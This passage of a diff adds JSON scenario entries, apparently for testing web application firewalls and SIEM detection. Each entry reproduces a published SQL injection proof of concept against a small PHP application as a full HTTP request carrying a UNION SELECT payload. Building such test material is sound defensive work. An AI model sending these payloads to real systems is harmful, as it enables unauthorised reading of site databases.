         "link": "https://vuldb.com/?id.353559"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2020-36543 - SialWeb CMS SQL Injection",
+    "displayName": "CVE-2020-36543 - SialWeb CMS SQL Injection",
+    "description": "SialWeb CMS is vulnerable to SQL injection in the Id parameter of /about.php. The request sends a UNION SELECT payload in Id. HTTP method inferred as GET (read/view-style id parameter); flagged as inferred. No vendor WAF rule found; built from the VulDB entry-point description.\n\nReferences used to recreate this request:\n- https://vuldb.com/?id.159429 (VulDB entry: file /about.php, argument Id)\n- https://www.cve.org/CVERecord?id=CVE-2020-36543 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /about.php?Id=-1%20UNION%20SELECT%201,2,3,4,5,6--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2020-36543"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 4,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_vuldb for CVE-2020-36543",
+        "link": "https://vuldb.com/?id.159429"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2020-36541 - Demokratian SQL Injection",
+    "displayName": "CVE-2020-36541 - Demokratian SQL Injection",
+    "description": "Demokratian is vulnerable to SQL injection in the id_provincia parameter of basicos_php/genera_select.php. The request sends the publicly disclosed UNION ALL SELECT payload in id_provincia. HTTP method inferred as GET (select-population parameter); flagged as inferred. No vendor WAF rule found; built from the VulDB description and the disclosed PoC payload.\n\nReferences used to recreate this request:\n- https://vuldb.com/?id.159434 (VulDB entry: file basicos_php/genera_select.php, argument id_provincia)\n- https://alquimistadesistemas.com/sql-injection-y-archivo-peligroso-en-demokratian (write-up)\n- https://bitbucket.org/csalgadow/demokratian_votaciones/commits/b56c48b519fc52efa65404c312ea9bbde320e3fa (fix commit)\n- https://www.cve.org/CVERecord?id=CVE-2020-36541 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /basicos_php/genera_select.php?id_provincia=-1%20union%20all%20select%201,2,3,4,database() HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2020-36541"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 4,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_vuldb for CVE-2020-36541",
+        "link": "https://vuldb.com/?id.159434"
+      },
+      {
+        "title": "poc_writeup for CVE-2020-36541",
+        "link": "https://alquimistadesistemas.com/sql-injection-y-archivo-peligroso-en-demokratian"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2020-36535 - MINMAX SQL Injection",
+    "displayName": "CVE-2020-36535 - MINMAX SQL Injection",
+    "description": "MINMAX is vulnerable to SQL injection in the id parameter of /newsDia.php. The request sends a UNION SELECT payload in id. HTTP method inferred as GET (read/view-style id parameter); flagged as inferred. No vendor WAF rule found; built from the VulDB entry-point description.\n\nReferences used to recreate this request:\n- https://vuldb.com/?id.159957 (VulDB entry: file /newsDia.php, argument id)\n- https://www.cve.org/CVERecord?id=CVE-2020-36535 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /newsDia.php?id=-1%20UNION%20SELECT%201,2,3,4--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2020-36535"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 4,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_vuldb for CVE-2020-36535",
+        "link": "https://vuldb.com/?id.159957"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2020-36112 - CSE Bookstore SQL Injection",
+    "displayName": "CVE-2020-36112 - CSE Bookstore SQL Injection",
+    "description": "CSE Bookstore 1.0 is vulnerable to SQL injection in the pubid parameter of bookPerPub.php. The request sends a UNION SELECT payload in pubid. HTTP method is GET as per the Exploit-DB PoC. No vendor WAF rule found; built from the Exploit-DB PoC.\n\nReferences used to recreate this request:\n- https://www.exploit-db.com/exploits/49314 (PoC: pubid parameter in bookPerPub.php)\n- https://www.cve.org/CVERecord?id=CVE-2020-36112 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /bookPerPub.php?pubid=-1%20UNION%20SELECT%201,2,3,4,5,6,7--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2020-36112"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_exploitdb for CVE-2020-36112",
+        "link": "https://www.exploit-db.com/exploits/49314"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2020-36084 - SourceCodester Responsive E-Learning System SQL Injection",
+    "displayName": "CVE-2020-36084 - SourceCodester Responsive E-Learning System SQL Injection",
+    "description": "SourceCodester Responsive E-Learning System 1.0 is vulnerable to SQL injection in the id parameter of /elearning/delete_teacher_students.php. The request sends a UNION SELECT payload in id. HTTP method is GET as per the Exploit-DB PoC (id passed in the query string). No vendor WAF rule found; built from the Exploit-DB PoC.\n\nReferences used to recreate this request:\n- https://www.exploit-db.com/exploits/49357 (PoC: /elearning/delete_teacher_students.php?id= SQL injection)\n- https://www.cve.org/CVERecord?id=CVE-2020-36084 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /elearning/delete_teacher_students.php?id=-1%20UNION%20SELECT%201,2,3--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2020-36084"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_exploitdb for CVE-2020-36084",
+        "link": "https://www.exploit-db.com/exploits/49357"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2020-36077 - Tailor Management System SQL Injection",
+    "displayName": "CVE-2020-36077 - Tailor Management System SQL Injection",
+    "description": "Tailor Management System v1 is vulnerable to SQL injection in the customer parameter of orderadd.php. The request sends a UNION SELECT payload in customer. HTTP method inferred as POST (orderadd is an add/save form action); flagged as inferred. No vendor WAF rule found; built from the researcher PoC.\n\nReferences used to recreate this request:\n- https://github.com/Abdallah-Fouad-X/CVE-s/blob/main/README.md (PoC: customer parameter of orderadd.php)\n- https://www.cve.org/CVERecord?id=CVE-2020-36077 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /orderadd.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\nCookie: PHPSESSID=dummy\n\ncustomer=-1%27%20UNION%20SELECT%201,2,3,4,5--%20-&title=x\n"
+    },
+    "cves": [
+      "CVE-2020-36077"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2020-36077",
+        "link": "https://github.com/Abdallah-Fouad-X/CVE-s/blob/main/README.md"
       }
     ],
     "public": false,
